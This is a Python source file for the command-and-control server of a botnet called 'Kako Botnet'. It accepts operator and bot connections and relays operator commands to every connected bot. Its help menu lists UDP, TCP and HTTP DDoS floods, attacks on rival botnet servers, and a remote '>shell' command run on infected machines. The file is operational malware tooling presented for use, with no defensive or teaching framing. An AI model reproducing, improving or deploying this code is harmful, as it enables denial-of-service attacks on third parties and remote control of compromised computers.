import sys
import time
import socket
import thread
import threading
from json import load
from urllib2 import urlopen
from thread import start_new_thread

connect = "" # IP. Leave empty
conport = 8080 # Your port
infport = 8000 # Bot port

clients = 0
bots = 0

ips = []
bc = []

print("Remember to add unwanted IP Addresses into the banned list before anyone starts to connect.")
print("If it doesn't say both Server and Bot started there is a problem.")

def clientDisconnect():
	global clients
	clients = clients - 1

def botDisconnect():
	global bots
	bots = bots - 1
	
def clientThread(conn):
	try:		
		createBanned = file("banned.txt", "a")
		banned = file("banned.txt")
		with open("banned.txt", "r") as banned:
			bannedLines = banned.readlines()

		for bannedLine in bannedLines:
			ip = load(urlopen('http://jsonip.com'))['ip']
			if ip in bannedLine:
				conn.send("[!] Your IP Address has been banned.\r\n")
				conn.send("[>] Please contact live:zerefdragneelbro on Skype, or [SuperNova] Law#6800 on Discord. For this to be removed. [<]\r\n")
				clientDisconnect()
				sys.exit()
			else:
				pass

		def username(conn, prefix="Username: "):
			conn.send(prefix)
			return conn.recv(512)

		def password(conn, prefix="Password: "):
			conn.send(prefix)
			return conn.recv(512)

		username = username(conn)
		password = password(conn)
		
		createLogin = file("login.txt", "a")

		with open("login.txt", "r") as login:
			lines = login.readlines()

		for line in lines:
			if line.split(":")[0] == username and line.split(":")[1] == password:
				conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
				conn.sendall("[?] Please use the custom client.py made by Law\r\n")
				conn.sendall("[?] Type >help for a list of commands\r\n")
				conn.sendall("[?] Your username is: %s" % username)
				while True:
					try:
						message = conn.recv(512)
						if message:
							reply = message
							broadcast(reply, conn)
						else:
							remove(conn)

						logs = file("logs.txt", "a")
						logs.write("%s - %s\r\n" % (username, message))

						if message.lower().startswith(">help"):
							conn.sendall("[>] Helpful Info [<]\r\n")
							conn.sendall("[>] and [<] = Notice\r\n")
							conn.sendall("[?] = Information\r\n")
							conn.sendall("[!] = Warning\r\n")
							conn.sendall("\r\n")
							conn.sendall("[>] Server Commands [<]\r\n")
							conn.sendall("[?] >help - Displays a help menu like this\r\n")
							conn.sendall("[?] >status - Displays Clients and Bots connected\r\n")
							conn.sendall("[?] >credits - Displays the Programmers and Helpers\r\n")
							conn.sendall("\r\n")
							conn.sendall("[>] Bot Commands [<]\r\n")
							conn.sendall("[!] Warning! These commands are built into the client made by Law not the server\r\n")
							conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
							conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
							conn.sendall("[?] >http [Target(without http://)] [Threads] [Time(S)] - HTTP DDoS Attack\r\n")
							conn.sendall("[?] >cnc [Target] [Port] [Amount of Connections] - This is an attack on other CNC Botnets\r\n")
							conn.sendall("[?] >killbots - Disconnects all bots\r\n")
							conn.sendall("[?] >shell [Command] - Allows the host to use commands from the bots terminal\r\n")
							conn.sendall("[?] >killattk - Stops all on going DDoS attacks\r\n")

						if message.lower().startswith(">status"):
							conn.sendall("[+] Clients Connected: %s\r\n" % clients)
							conn.sendall("[+] Bots Connected: %s\r\n" % bots)

						if message.lower().startswith(">credits"):
							conn.sendall("[?] Law - Idea and main Programmer(AKA the guy who made this command)\r\n")
							conn.sendall("[?] Also coded the client.py file from scratch\r\n")
							conn.sendall("[?] Picses - Coded the bot connection\r\n")
							conn.sendall("[?] Mac.G - Helped figure out how to broadcast commands using a list\r\n")
					except:
						break
					if not message:
						break
				clientDisconnect()
				sys.exit()
		else:
			try:
				ip = load(urlopen('http://jsonip.com'))['ip']
				fail = file("fails.txt", "a")
				fail.write("%s:%s:%s\r\n" % (ip, username, password))
				conn.send("[!] Incorrect Information!\r\n")
				conn.send("[!] Your IP Address has been logged.\r\n")
				clientDisconnect()
				time.sleep(3)
				conn.close()
			except:
				clientDisconnect()
				conn.close()
	except:
		pass

def startClient():
	host = connect
	port = conport
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind((host, port))
	sock.listen(999999)
	time.sleep(0.10)
	print("[+] Server Started")
	while True:
		global clients
		time.sleep(1)
		conn, addr = sock.accept()
		bc.append(conn)
		clients = clients + 1

		start_new_thread(clientThread, (conn,))
	sock.close()

def bot_thread(conn):
	ip = load(urlopen('http://jsonip.com'))['ip']
	if ip in ips:
		print("[*] DUP Detected. Removing DUP.")
		conn.send("46617043704647071717889523522")
		conn.close()

	ips.append(ip)
	while True:
		try:
			data = conn.recv(512)
		except:
			print("[-] Bot Disconnected.")
			break
		if not data:
			pass
	ips.remove(ip)
	botDisconnect()
	conn.close()

def startBot():
	host = connect
	port = infport
	infsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	infsock.bind((host, port))
	infsock.listen(999999)
	time.sleep(0.5)
	print("[+] Bot Started")
	while True:
		global bots
		time.sleep(1)
		conn, addr = infsock.accept()
		bc.append(conn)
		bots = bots + 1

		start_new_thread(bot_thread, (conn,))
	infsock.close()

def broadcast(message, connection):
    for bots in bc:
        if bots != connection:
            try:
                bots.sendall(message)
            except:
                bots.close()
                remove(bots)

def remove(connection):
    if connection in bc:
        bc.remove(connection)

client = threading.Thread(target=startClient, args=(""), name='Client Session Handler')
client.start()

botnet = threading.Thread(target=startBot, args=(""), name='Bot Session Handler')
botnet.setDaemon(True)
botnet.start()
